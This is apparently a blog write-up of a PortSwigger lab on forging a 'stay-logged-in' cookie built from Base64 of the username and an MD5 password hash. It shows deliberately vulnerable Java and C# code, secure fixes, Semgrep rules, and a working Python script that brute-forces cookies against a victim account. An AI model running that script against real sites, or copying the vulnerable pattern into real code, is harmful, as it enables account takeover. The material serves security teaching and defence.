---
title: "Lab 09: Brute-forcing a stay-logged-in cookie"
date: 2025-12-20
categories: [portswigger, authentication] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-20-lab09_authentication/
--- 

## 1. Executive Summary

**Vulnerability:** Predictable Session Token (Insecure Cookie Construction).

**Description:** The application implements a "Stay Logged In" feature by creating a persistent cookie. However, the cookie's value is constructed using a predictable pattern: `Base64(username + ":" + MD5(password))`. Since the cookie is derived directly from the password, an attacker can brute-force the cookie offline or online by generating valid cookies for candidate passwords.

**Impact:** Account Takeover. If an attacker can guess the password (via dictionary attack), they can forge a valid "Stay Logged In" cookie and hijack the session without ever interacting with the login form or bypassing rate limits.

## 2. The Attack

**Objective:** Forge a valid cookie for `carlos` and access his account.

1. **Reconnaissance (Reverse Engineering):**
    - I logged in as `wiener` with the "Stay logged in" checkbox enabled.
    - I inspected the resulting cookie: `stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw`.
    - I decoded the Base64 string: `wiener:51dc30ddc473d43a6011e9ebba6ca770`.
        
        ![image.png](image.png)
        
    - The first part is obviously the username. The second part looked like a hash.
    - I dehashed my password (`peter`) using Crackstation https://crackstation.net/: `51dc30ddc473d43a6011e9ebba6ca770`.
        
        ![image.png](image%201.png)
        
    - **Conclusion:** The algorithm is `Base64(username + ":" + MD5(password))`.
2. **Exploitation:**
    - I used Burp Intruder (or a script) to generate payloads for the victim `carlos`.
    - **Input:** A list of candidate passwords.
    - **Processing Rule:**
        1. Hash payload (MD5).
        2. Add prefix `carlos:`.
        3. Encode Base64.
            
            ![image.png](image%202.png)
            
    - I injected this forged cookie into a request to `/my-account`.
3. **Result:**
    - When the password from the list was correct, the server accepted the forged cookie.
    - The response contained the text "Log out" (indicating a valid session), whereas failed cookies resulted in a redirect or "Login" page.
        
        ![image.png](image%203.png)
        

## 3. Code Review

**Vulnerability Analysis (Explanation):**
The flaw is using **Stateful/Derived Tokens** instead of **Opaque/Random Tokens**. The developer tried to be "clever" by packing the authentication data into the cookie itself so the database doesn't need to store a session ID.

- **The Flaw:** The token is simply an obfuscated version of the password. It is not a secret; it is just the credentials in a different format.
- **The Reality:** Persistent tokens should be long, random strings that have no mathematical relationship to the user's password.

### Java (Spring Boot)

```java
@GetMapping("/my-account")
public String myAccount(@CookieValue(value = "stay-logged-in", required = false) String cookie, Model model) {
    if (cookie != null) {
        // VULNERABLE: Manual decoding of a custom cookie format
        String decoded = new String(Base64.getDecoder().decode(cookie));
        String[] parts = decoded.split(":");
        
        String username = parts[0];
        String hash = parts[1];
        
        User user = userRepository.findByUsername(username);
        
        // VULNERABLE: Validating by re-hashing the password
        // This means if I know the password, I can forge the cookie.
        if (MD5(user.getPassword()).equals(hash)) {
            model.addAttribute("user", user);
            return "account_page";
        }
    }
    return "redirect:/login";
}
```

**Technical Flow & Syntax Explanation:**

- **`Base64.getDecoder().decode(cookie)`**: Reverses the encoding step, exposing the structure `user:hash`.
- **`MD5(user.getPassword())`**: The server verifies the cookie by rehashing the stored password. This confirms that the cookie is essentially a "secondary password."
- **The Bypass:** Because the generation algorithm (`MD5`) is standard and the inputs (`username` and `password`) are guessable, the attacker acts as the server, generating the valid token locally.

### C# (ASP.NET Core)

```csharp
public IActionResult ValidateCookie(string stayLoggedInCookie)
{
    // VULNERABLE: Reconstructing the token from user data
    var decodedBytes = Convert.FromBase64String(stayLoggedInCookie);
    var decodedText = Encoding.UTF8.GetString(decodedBytes); // "carlos:hash"
    
    var parts = decodedText.Split(':');
    var user = _db.Users.SingleOrDefault(u => u.Username == parts[0]);

    // VULNERABLE: Comparison logic
    // We are checking if the cookie holds the MD5 of the password.
    var expectedHash = ComputeMD5(user.Password);
    
    if (parts[1] == expectedHash)
    {
        SignIn(user);
        return Ok();
    }
    return Unauthorized();
}
```

**Technical Flow & Syntax Explanation:**

- **`Convert.FromBase64String`**: Decodes the payload.
- **`ComputeMD5`**: A weak hashing algorithm. Even if this were SHA-256, the vulnerability would remain because the input (the password) is low-entropy (guessable).
- **Logic Gap**: Authentication should rely on **something you have** (a random session ID issued by the server), not just **something you know** (password) reformatted.

### Mock PR Comment

The "Stay Logged In" feature currently constructs cookies using `Base64(username + ":" + MD5(password))`. This allows attackers to brute-force the cookie offline or forge it easily if they guess the password.

**Recommendation:** Switch to **Opaque Tokens**. When a user logs in, generate a cryptographically secure random string (e.g., 32 bytes of entropy), store it in the database `user_tokens` table, and send *that* random string as the cookie. Do not embed user data inside the cookie.

## 4. The Fix

**Explanation of the Fix:**
We stop deriving the cookie from the password. Instead, we generate a **Random Token**.

1. **Login:** Generate `SecureRandom` string. Save it to DB. Send to Client.
2. **Validate:** Receive Cookie. Look up Cookie in DB. If found, log user in.

### Secure Java

Java

`@PostMapping("/login")
public void login(HttpServletResponse response, User user) {
    // SECURE: Generate a random, high-entropy token
    String token = UUID.randomUUID().toString(); // Or SecureRandom
    
    // Store in DB
    persistentTokenRepository.save(new PersistentToken(user, token));
    
    // Send opaque token to user
    Cookie cookie = new Cookie("stay-logged-in", token);
    cookie.setHttpOnly(true);
    response.addCookie(cookie);
}

@GetMapping("/my-account")
public String checkToken(@CookieValue("stay-logged-in") String token) {
    // SECURE: Lookup by token. 
    // The token contains NO user info and cannot be calculated from a password.
    PersistentToken dbToken = persistentTokenRepository.findByToken(token);
    
    if (dbToken != null) {
        return "account_page";
    }
    return "redirect:/login";
}`

**Technical Flow & Syntax Explanation:**

- **`UUID.randomUUID().toString()`**: Generates a 128-bit random string. This value has no relation to the username or password. An attacker cannot derive this value offline.
- **`persistentTokenRepository.save(...)`**: The token is stored in a backend database table (mapping Token -> User).
- **`findByToken(token)`**: Verification is now a database lookup. If the token exists in the DB, the user is authenticated. If an attacker tries to forge a token, the lookup will simply fail because the random string won't exist in the database.

### Secure C#

C#

`public void SignIn(User user)
{
    // SECURE: Cryptographically secure random number generator
    var tokenData = new byte[32];
    using (var rng = RandomNumberGenerator.Create())
    {
        rng.GetBytes(tokenData);
    }
    string token = Convert.ToBase64String(tokenData);

    // Save 'token' to database associated with 'user'
    _db.UserTokens.Add(new UserToken { UserId = user.Id, Token = token });
    _db.SaveChanges();

    Response.Cookies.Append("stay-logged-in", token, new CookieOptions { HttpOnly = true });
}`

**Technical Flow & Syntax Explanation:**

- **`RandomNumberGenerator.Create()`**: This uses the operating system's CSPRNG (Cryptographically Secure Pseudo-Random Number Generator) to create a token that is statistically impossible to predict.
- **`Convert.ToBase64String(tokenData)`**: The random bytes are converted to a string simply for transport safety in the HTTP header; the underlying value remains random.
- **`_db.UserTokens.Add`**: We persist the token. This pattern is called "Reference Token" or "Opaque Token" because the token is just a reference key to server-side data, containing no data itself.

## 5. Automation

*A Python script that replicates the Burp Intruder logic: generating the hash, encoding it, and testing requests.*

```python
#!/usr/bin/env python3
import argparse
import requests
import hashlib
import base64
import sys

def exploit_cookie_bruteforce(url, username, password_file):
    target_url = f"{url.rstrip('/')}/my-account"
    print(f"[*] Targeting: {target_url}")
    print(f"[*] Victim: {username}")

    with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Loaded {len(passwords)} passwords. Starting attack...")

    for password in passwords:
        # 1. MD5 Hash the password
        md5_hash = hashlib.md5(password.encode()).hexdigest()
        # 2. Construct the payload: "username:hash"
        payload_str = f"{username}:{md5_hash}"
        
        # 3. Base64 Encode
        # Note: Python base64 requires bytes, so we encode() then decode() back to string
        cookie_val = base64.b64encode(payload_str.encode()).decode()
        
        # 4. Send Request
        cookies = {"stay-logged-in": cookie_val}
        
        try:
            resp = requests.get(target_url, cookies=cookies, allow_redirects=False, timeout=5)
            
            # Check for success indicators
            if "Log out" in resp.text or "Update email" in resp.text:
                print(f"\n[!!!] SUCCESS! Cookie found.")
                print(f"[+] Password: {password}")
                print(f"[+] Cookie: {cookie_val}")
                return
                
        except Exception as e:
            print(f"[-] Error: {e}")

    print("\n[-] Password not found in list.")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url", help="Lab URL")
    ap.add_argument("username", help="Victim username (e.g. carlos)")
    ap.add_argument("wordlist", help="Password list")
    args = ap.parse_args()

    exploit_cookie_bruteforce(args.url, args.username, args.wordlist)

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

*These rules detect code that constructs a "cookie" string by combining a username and a hash of a password, indicating a predictable token.*

### Java Rule

```yaml
rules:
  - id: java-predictable-cookie-construction
    languages: [java]
    message: |
      Detected manual construction of a cookie using Username and Password hash.
      This creates predictable tokens. Use SecureRandom or UUIDs stored in the DB instead.
    severity: ERROR
    patterns:
      - pattern: |
          // Matches: Base64.encode(user + ":" + md5(pass)) logic
          String $PAYLOAD = $USER + ":" + $HASH;
          ...
          Base64.getEncoder().encodeToString($PAYLOAD.getBytes());
      - pattern-either:
          - pattern: MessageDigest.getInstance("MD5")
          - pattern: DigestUtils.md5Hex(...)
```

**Technical Flow & Syntax Explanation:**

- **`$PAYLOAD = $USER + ":" + $HASH`**: This pattern captures the concatenation of a user identifier with a hash value, a common signature of homemade token construction.
- **`Base64.getEncoder()`**: This identifies that the resulting string is being encoded for transport (likely a cookie), matching the vulnerability pattern.
- **`MessageDigest...MD5`**: This sub-pattern reinforces the finding by checking if a weak hashing algorithm is part of the flow.

### C# Rule

```yaml
rules:
  - id: csharp-predictable-cookie-construction
    languages: [csharp]
    message: "Cookie constructed from password hash. Use random opaque tokens."
    severity: ERROR
    patterns:
      - pattern: |
          var $PAYLOAD = $USER + ":" + $HASH;
          ...
          Convert.ToBase64String(Encoding.UTF8.GetBytes($PAYLOAD));
```

**Technical Flow & Syntax Explanation:**

- **`var $PAYLOAD`**: Captures the variable assignment where the string is built.
- **`$USER + ":" + $HASH`**: Matches the specific format of combining user data with a hash (the colon is a common delimiter).
- **`Convert.ToBase64String`**: Identifies the encoding step used to make the token URL-safe/Cookie-safe. Combining these elements flags the logic as a predictable token generation routine.
